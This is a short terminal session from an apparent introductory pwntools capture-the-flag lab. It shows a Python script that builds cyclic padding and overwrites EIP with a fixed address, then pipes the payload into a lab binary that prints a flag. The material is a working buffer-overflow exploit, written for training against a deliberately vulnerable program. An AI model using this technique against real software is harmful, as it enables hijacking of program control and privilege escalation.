buzz@intro2pwn:~/IntroToPwntools/IntroToPwntools/cyclic$ nano pwn_cyclic.py 
buzz@intro2pwn:~/IntroToPwntools/IntroToPwntools/cyclic$ cat pwn_cyclic.py 
from pwn import *

padding = cyclic(cyclic_find('jaaa'))

eip = p32(0x8048536)

payload = padding + eip

print(payload)

buzz@intro2pwn:~/IntroToPwntools/IntroToPwntools/cyclic$ python pwn_cyclic.py > attack
buzz@intro2pwn:~/IntroToPwntools/IntroToPwntools/cyclic$ ./intro2pwn3 < attack
I run as dizmas.
Who are you?: Getting Flag:
flag{13@rning_2_pwn!}
